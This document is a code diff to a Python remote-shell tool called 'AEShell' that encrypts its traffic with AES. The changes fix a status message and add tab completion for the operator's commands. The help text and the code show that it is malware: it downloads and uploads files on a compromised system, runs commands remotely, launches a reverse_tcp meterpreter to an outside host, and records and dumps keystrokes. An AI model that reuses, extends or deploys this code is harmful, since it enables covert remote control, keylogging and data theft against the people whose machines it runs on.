@@ -169,7 +169,7 @@ while 1:
 			else:
 				f.write(decrypted)
 		f.close()
-		encrypted = EncodeAES(cipher, " [*] File uploaded to %s!**nEOFEOFEOFEOFEOFX" % (ufilename))
+		encrypted = EncodeAES(cipher, " [*] File uploaded to %s**nEOFEOFEOFEOFEOFX" % (ufilename))
 		s.send(encrypted)
 
 	elif decrypted.startswith('run '):
@@ -230,6 +230,13 @@ from Crypto.Cipher import AES
 from Crypto import Random
 import readline,socket,base64,os,sys,string
 
+def completer(text, state):
+	options = [i for i in commands if i.startswith(text)]
+	if state < len(options):
+		return options[state]
+	else:
+		return None
+
 def fnextcmd():
 	global nextcmd, downfile, upfile
 	nextcmd = False
@@ -253,8 +260,8 @@ def fnextcmd():
 				fnextcmd()
 
 	elif nextcmd == '?' or nextcmd == 'help':
-		print ' AEShell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run command         -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
- 		fnextcmd()
+		print ' AEShell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
+		fnextcmd()
 
 	elif nextcmd.startswith('download '):
 		downfile = nextcmd.split(' ')[1].split('/')[-1].split('***')[-1]
@@ -265,6 +272,9 @@ def fnextcmd():
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
+commands = ['download ', 'upload ', 'met ', 'keyscan', 'keydump', 'keyclear', 'run ']
+readline.parse_and_bind("tab: complete")
+readline.set_completer(completer)
 BLOCK_SIZE = 32
 PADDING = '{'
 pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
